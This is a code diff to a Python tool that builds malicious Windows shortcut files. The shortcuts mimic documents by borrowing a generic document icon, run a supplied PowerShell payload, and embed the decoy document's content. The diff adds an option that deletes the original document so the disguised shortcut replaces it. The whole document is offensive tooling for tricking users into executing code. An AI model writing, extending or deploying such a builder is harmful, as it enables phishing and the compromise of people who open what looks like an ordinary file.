@@ -38,7 +38,7 @@ class Document:
         self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
         self.icon_index = 85 # Index within imageres.dll for document icon
 
-def write_lnk_using_document(target, document, payload):
+def write_lnk_using_document(target, document, payload, overwrite = False):
     try:
         lnk_name = os.path.basename(document.document_path) + ".lnk"
         delimiter = b"---LNK_DOCUMENT_BOUNDARY---"
@@ -69,6 +69,9 @@ def write_lnk_using_document(target, document, payload):
         with open(lnk_name, "ab") as lnk_handle:
             lnk_handle.write(delimiter)
             lnk_handle.write(document.document_content)
+
+        if overwrite:
+            os.remove(document.document_path)
 
     except Exception as e:
         print(f"An error occured while writing .lnk file: {e}")
@@ -103,6 +106,13 @@ def main():
         help='Pass PowerShell script as a string argument'
     )
 
+    parser.add_argument(
+        '-o',
+        '--overwrite',
+        action='store_true',
+        help='Overwrite document file with created shortcut file'
+    )
+
     args = parser.parse_args()
 
     if args.document is None:
@@ -127,7 +137,7 @@ def main():
     else:
         payload = args.string
 
-    write_lnk_using_document(powershell_path, document, payload)
+    write_lnk_using_document(powershell_path, document, payload, args.overwrite)
 
 if __name__ == "__main__":
     main()
